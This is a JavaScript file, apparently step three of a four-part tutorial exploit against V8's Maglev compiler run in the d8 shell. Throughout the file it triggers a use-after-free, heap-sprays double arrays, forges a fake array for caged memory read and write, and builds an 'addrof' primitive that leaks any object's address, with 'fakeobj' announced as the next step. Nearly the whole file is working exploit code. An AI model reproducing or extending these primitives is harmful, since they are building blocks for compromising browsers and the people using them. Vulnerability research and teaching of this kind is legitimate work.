// ============================================================================
//  Maglev primitives -- STEP 3 / 4 -- addrof
//
//     1_caged_read.js                    trigger -> UAF -> fake array -> read
//     2_caged_write.js                   + caged write
//     3_addrof.js       <-- YOU ARE HERE   + addrof
//     4_fakeobj.js                       + fakeobj   (== poc3.js)
//
//  Same engine + caged read/write as step 2. NEW this step (*): a "marker array"
//  we can find in memory. We allocate an array holding [someObject, MARKER] right
//  next to the memory anchor, use caged read to scan for MARKER, and thereby
//  locate the slot holding someObject -- read that slot and we have the object's
//  address. Engine comments are terse; see steps 1-2 / ../poc3.js.
//
//  Run:   d8 --allow-natives-syntax --maglev --no-turbofan 3_addrof.js
// ============================================================================

function log(s)       { print(s); }
function ok(s)        { print('  [ok]   ' + s); }
function step(s)      { print('\n=== ' + s + ' ==='); }
function hex(x)       { return '0x' + (x >>> 0).toString(16); }
function die(s)       { print('[FAIL] ' + s); throw new Error(s); }
function assert(c, s) { if (!c) die(s); }

const punF = new Float64Array(1);
const punU = new Uint32Array(punF.buffer);
const punI = new Int32Array(punF.buffer);
function pack(lo, hi) { punU[0] = lo >>> 0; punU[1] = hi >>> 0; return punF[0]; }
const hnSrc = new Float64Array(1); hnSrc[0] = 11.0;

const HN_MAP = 0x515, EMPTY_FA = 0x7bd, DOUBLE_MAP = 0x0100cf51;
const MARKER = 0x1badc0de, MARKER_TAG = (MARKER << 1) >>> 0;   // * recognizable Smi

let aD1=0;aD1=0x40000000;let bD1=11;var cD1=0;cD1=1;
let aD2=0;aD2=0x40000000;let bD2=11;var cD2=0;cD2=1;
let aD3=0;aD3=0x40000000;let bD3=11;var cD3=0;cD3=1;
let aT =0;aT =0x40000000;let bT =11;var cT =0;cT =1;
function decoy1(x)  { aD1 = x; bD1 = x; cD1 = x; }
function decoy2(x)  { aD2 = x; bD2 = x; cD2 = x; }
function decoy3(x)  { aD3 = x; bD3 = x; cD3 = x; }
function trigger(x) { aT  = x; bT  = x; cT  = x;  }
function warm(n)    { for (let i = 0; i < n; i++) { decoy1(11); decoy2(11); decoy3(11); trigger(11); } }

function readWord(arr, off) {
  punF[0] = arr[((off & ~7) - 8) >>> 3];
  return (off & 4) ? punI[1] : punI[0];
}
function writeWord(arr, off, v) {
  const i = ((off & ~7) - 8) >>> 3;
  punF[0] = arr[i];
  if (off & 4) punI[1] = v | 0; else punI[0] = v | 0;
  arr[i] = punF[0];
}
function findSentinel(arr, lo, hi) {              // * NEW: find MARKER_TAG in a dbl array
  for (let i = lo; i < hi; i++) {
    punF[0] = arr[i];
    if (punI[0] === (MARKER_TAG | 0)) return i << 1;
    if (punI[1] === (MARKER_TAG | 0)) return (i << 1) | 1;
  }
  return -1;
}

let altObj = {}, objArr;                          // * the marker array (filled below)

const ELEMS = 256, NSPRAY = 600;
let spray = new Array(NSPRAY), seaArr;

(function warmUp1() { warm(3000); let j = 0; for (let i = 0; i < 1000000; i++) j += i; warm(1000); })();

(function buildSpray() {
  seaArr = [pack(HN_MAP, HN_MAP)];
  for (let e = 1; e < ELEMS; e++) seaArr.push(seaArr[0]);
  for (let s = 0; s < NSPRAY; s++) spray[s] = seaArr.slice();
})();

(function warmUp2() {
  warm(5000); for (let w = 0; w < 5000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
  let j = 0; for (let i = 0; i < 2000000; i++) j += i;
  warm(2000); for (let w = 0; w < 2000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
})();

step('STEP 3  Trigger, reclaim, forge a fake array, widen to a cage window');

trigger(hnSrc[0]);

const CHURN_PER_ROUND = 1100, CHURN_ROUNDS = 20;
let churnArrs = new Array(CHURN_PER_ROUND * CHURN_ROUNDS), churnCount = 0;
(function churn() {
  for (let r = 0; r < CHURN_ROUNDS; r++) {
    for (let s = 0; s < CHURN_PER_ROUND; s++) churnArrs[churnCount++] = seaArr.slice();
    if (typeof cT !== 'number') return;
    punF[0] = cT; if (punU[1] !== 0x40260000) return;
  }
})();
assert(typeof cT === 'number', 'reclaim miss (cT on a non-number header)');
punF[0] = cT;
assert(punU[0] === HN_MAP && punU[1] === HN_MAP, 'reclaim miss: cT reads ' + hex(punU[1]) + '_' + hex(punU[0]));
ok('cT dangles into the 0x515 sea (after ' + churnCount + ' churn arrays)');

const probeDbl = pack(HN_MAP, 0x517), seaDbl = pack(HN_MAP, HN_MAP);
let elemIdx = -1, align = -1;
(function findElement() {
  for (let k = 0; k < ELEMS; k++) {
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = probeDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = probeDbl;
    if (typeof cT !== 'number') { elemIdx = k; align = 4; return; }
    punF[0] = cT;
    if (punU[0] === 0x517) { elemIdx = k;     align = 0; return; }
    if (punU[1] === 0x517) { elemIdx = k - 1; align = 4; return; }
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = seaDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = seaDbl;
  }
})();
assert(elemIdx >= 0, 'could not locate cT within the spray');

let arrIdx = -1, srcPool = null;
(function findSource() {
  for (let s = 0; s < NSPRAY; s++)     spray[s][elemIdx]     = probeDbl;
  for (let s = 0; s < churnCount; s++) churnArrs[s][elemIdx] = probeDbl;
  if (align === 0) {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  } else {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  }
})();
assert(arrIdx >= 0, 'could not identify cT source array');
ok('cT overlaps ' + (srcPool === churnArrs ? 'churnArrs' : 'spray') + '[' + arrIdx + '] element [' + elemIdx + '] +' + align);

function forgeArray(map, properties, elements, length) {
  const a = srcPool[arrIdx];
  if (align === 0) {
    a[elemIdx]     = pack(map, properties);
    a[elemIdx + 1] = pack(elements, length);
  } else {
    a[elemIdx]     = pack(HN_MAP, map);
    a[elemIdx + 1] = pack(properties, elements);
    a[elemIdx + 2] = pack(length, HN_MAP);
  }
}

forgeArray(DOUBLE_MAP, EMPTY_FA, EMPTY_FA, 0);
cT[0] = 1.1;
punF[0] = srcPool[arrIdx][elemIdx + 1];
let anchor = (align === 0 ? punI[0] : punI[1]) - 1;
assert(anchor > 0 && cT[0] === 1.1, 'anchor leak failed (' + hex(anchor) + ')');
ok('memory anchor = ' + hex(anchor));

objArr = [altObj, MARKER];                        // * target array, allocated near the anchor
forgeArray(DOUBLE_MAP, EMPTY_FA, 1, 0x7ffffffe);
function cageRead(off)     { return readWord(cT, off) >>> 0; }
function cageWrite(off, v) { writeWord(cT, off, v); }
ok('cage-wide read/write online');

// * NEW THIS STEP * -----------------------------------------------------------
// objArr was allocated immediately after the anchor's backing store; young-gen is
// a bump allocator, so objArr lands within a few hundred bytes of `anchor`. We scan
// that small window [anchor, anchor+1KB) for MARKER, then verify we found the right
// array by toggling objArr[0] and checking the word 4 bytes before the marker (that
// word is objArr[0]) changes with it.
step('STEP 3  Scan for the marker  ==>  addrof');
let objSlot = -1;
{
  let lo = (anchor & ~7) >>> 3, hi = ((anchor + 1024) & ~7) >>> 3, i = lo;
  while (i < hi) {
    // findSentinel returns (elementIndex << 1) | half, or -1: `h >>> 1` is the
    // element index, `h & 1` is which 32-bit half held MARKER.
    let h = findSentinel(cT, i, hi);
    if (h < 0) break;
    // marker's cage byte offset = header(8) + index*8 (+4 for the high half); step
    // back one 4-byte slot (-4) to reach objArr[0], which precedes objArr[1]=MARKER.
    let cand = (h & 1) ? ((h >>> 1) * 8 + 12 - 4) : ((h >>> 1) * 8 + 8 - 4);
    i = (h >>> 1) + 1;
    let before = cageRead(cand);
    if ((before & 1) !== 1) continue;
    objArr[0] = objArr;
    let after = cageRead(cand);
    objArr[0] = altObj;
    if (after !== before && (after & 1) === 1) { objSlot = cand; break; }
  }
}
assert(objSlot >= 0, 'marker scan failed near anchor ' + hex(anchor));
ok('objArr element[0] at cage offset ' + hex(objSlot));
function addrOf(o) { objArr[0] = o; return cageRead(objSlot) - 1; }   // PRIMITIVE 3

step('DEMONSTRATION  addrof');
let victim = { tag: 0x41414141 };
log('  %DebugPrint(victim) prints the real address next:');
%DebugPrint(victim);
log('  addrOf(victim) = ' + hex(addrOf(victim)) + '   (low bits match the address above)');
// cross-check against caged read: the map word at a double array is DOUBLE_MAP.
let probe = [1.1, 2.2];
assert(cageRead(addrOf(probe)) === DOUBLE_MAP, 'addrof/read cross-check failed');
ok('cross-check: map@addrOf([1.1,2.2]) = ' + hex(cageRead(addrOf(probe))) + ' === DOUBLE_MAP');
ok('==> addrof: the address of any JS object');

(function cleanup() {
  srcPool[arrIdx][elemIdx]     = seaDbl;
  srcPool[arrIdx][elemIdx + 1] = seaDbl;
  if (align) srcPool[arrIdx][elemIdx + 2] = seaDbl;
  objArr[0] = altObj;
  cT = 0;
})();

log('\n----------------------------------------------------------------');
log(' STEP 3 COMPLETE: addrof. Next: 4_fakeobj.js adds fakeobj (the last one).');
log('----------------------------------------------------------------');
